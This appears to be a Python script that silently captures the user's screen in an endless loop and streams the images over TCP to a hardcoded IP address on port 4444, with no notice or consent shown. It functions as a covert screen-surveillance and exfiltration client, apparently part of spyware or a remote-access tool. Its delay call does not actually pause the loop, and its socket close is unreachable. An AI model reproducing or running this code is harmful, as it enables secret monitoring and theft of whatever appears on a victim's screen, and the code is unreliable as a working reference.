import sys
from PyQt5.QtWidgets import QApplication
from PyQt5.QtGui import QImage
from PyQt5.QtCore import QTimer
from socket import socket, AF_INET, SOCK_STREAM
import struct
import io

def send_screenshot(connection):
    while True:
        try:
            # Capture the screen
            screen = QApplication.primaryScreen()
            screenshot = screen.grabWindow(0).toImage()

            # Convert the screenshot to bytes
            buffer = io.BytesIO()
            screenshot.save(buffer, format='PNG')
            buffer.seek(0)
            image_data = buffer.read()

            # Send the length of the data first
            data_len = len(image_data)
            connection.sendall(struct.pack('>I', data_len))

            # Send the image data in chunks
            connection.sendall(image_data)

            # Wait before capturing the next screenshot
            QTimer.singleShot(100, lambda: None)  # Adjust the delay as needed
        except Exception as e:
            print(f"Error capturing or sending screenshot: {e}")

if __name__ == '__main__':
    app = QApplication(sys.argv)

    ip = '172.26.136.52'  # Replace with the server IP address
    port = 4444

    # Create a socket object
    connection = socket(AF_INET, SOCK_STREAM)
    connection.connect((ip, port))

    # Send screenshots continuously
    send_screenshot(connection)
    
    connection.close()
